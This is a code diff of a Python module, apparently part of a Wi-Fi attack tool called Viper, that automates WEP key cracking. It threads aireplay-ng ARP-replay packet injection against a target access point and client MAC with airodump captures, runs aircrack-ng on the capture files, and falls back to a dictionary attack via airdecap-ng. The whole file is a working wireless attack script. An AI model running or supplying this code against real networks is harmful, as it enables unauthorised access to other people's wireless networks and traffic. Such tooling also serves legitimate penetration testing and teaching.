@@ -1,42 +1,74 @@
-import subprocess as sb
+from Viper.util.channel import change_channel
+from Viper.scan.dump import airodump
+
+import subprocess
+from threading import Thread
 import os
 import time
+import re
 
-def attack_wep(): 
 
-    # directory = '/home/kali/Viper/results'
-    # interface = 'wlan0'
-    # ap_mac_address = '70:72:3C:C5:55:F3'
-    # channel = '6'
-    # c_mac = 'D0:37:45:7B:1F:85'
-    # pcapfilewep=os.path.join(directory,'wepcracking')
+def aireplay(interface, ap_mac_address, c_mac, seconds):
+    print('Starting aireplay')
+    try:
+        command = subprocess.run(['aireplay-ng', '-3', '-b', ap_mac_address, '-h',
+                       c_mac, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds)
+        print(command.args)
+    except subprocess.TimeoutExpired:
+        pass
 
-    # sb.run(['iwconfig', interface, 'channel', channel])
-    # try:
-    #     first_command_wep = sb.run(['aireplay-ng','-3','-b',ap_mac_address,'-h',c_mac, interface], timeout=15)
-    # except sb.TimeoutExpired:
-    #     pass
 
-    # try:
-    #     second_command_wep= sb.run(['airodump-ng','--bssid',ap_mac_address,'--channel',channel, '--write', pcapfilewep, interface],shell=True)
-    # except sb.TimeoutExpired:
-    #     pass
+def wep_crack(interface, ap_mac_address, c_mac, channel, directory, seconds, dictionary):
+    orignial_time = seconds
+    pcapfilewep = os.path.join(directory, 'wep')
+    passfile = os.path.join(directory, 'wep_password')
+    change_channel(interface, channel)
+    print(pcapfilewep)
+    ctr = 1
+    while ctr < 4:
+        print(f'Starting iteration {ctr}')
+        a = Thread(target=aireplay, args=(
+            interface, ap_mac_address, c_mac, seconds,))
+        b = Thread(target=airodump, args=(
+            interface, ap_mac_address, channel, pcapfilewep, seconds,))
+        a.start()
+        b.start()
 
-    # time.sleep(30)
-    sb.run(['/home/kali/Viper/test.sh'])
-    third_command_wep=sb.run(['aircrack-ng',f'{pcapfilewep}-01.cap'],capture_output=True,text=True)
-    print(third_command_wep.stdout)
+        time.sleep(seconds)
+        a.join()
+        b.join()
+        try:
+            subprocess.run(['aircrack-ng', f'{pcapfilewep}-0{ctr}.cap', '-l',
+                            f'{passfile}'], stdout=subprocess.DEVNULL, timeout=10)
+        except subprocess.TimeoutExpired:
+            pass
 
-def wep_crack_no_ivs():
+        if os.path.exists(passfile):
+            with open(passfile, 'r') as f:
+                password = bytes.fromhex(f.read()).decode()
+            return password
+        else:
+            print('Failed, increasing time')
+            seconds += orignial_time
+            ctr += 1
 
-    lst = open('/usr/share/wordlists/ok.lst' , 'r') 
+    wep_crack_no_ivs(pcapfilewep, dictionary)
+
+
+def wep_crack_no_ivs(pcapfilewep, dictionary):
+
+    lst = open(dictionary, 'r')
     for line in lst:
-        word=re.sub(r'\W+', '', line) 	
-        word.isalpha()          
-        word=word.encode('utf-8').hex()                        
-        p = Popen(['airdecap-ng', '-w', word, '/home/kali/Viper/results/pcapfile-02.cap'] , stdout=PIPE)
+        word = re.sub(r'\W+', '', line)
+        word.isalpha()
+        word = word.encode('utf-8').hex()
+        p = subprocess.Popen(
+            ['airdecap-ng', '-w', word, f'{pcapfilewep}-03.cap'], stdout=subprocess.PIPE)
         output = p.stdout.read().decode().split('\n')
         for i in output:
             if 'Number of decrypted WEP  packets' in i:
                 if int(i.split(' ')[-1]) > 0:
-                    print(f'The WEP key is {line}')
+                    password = line
+                    return password
+
+    return None
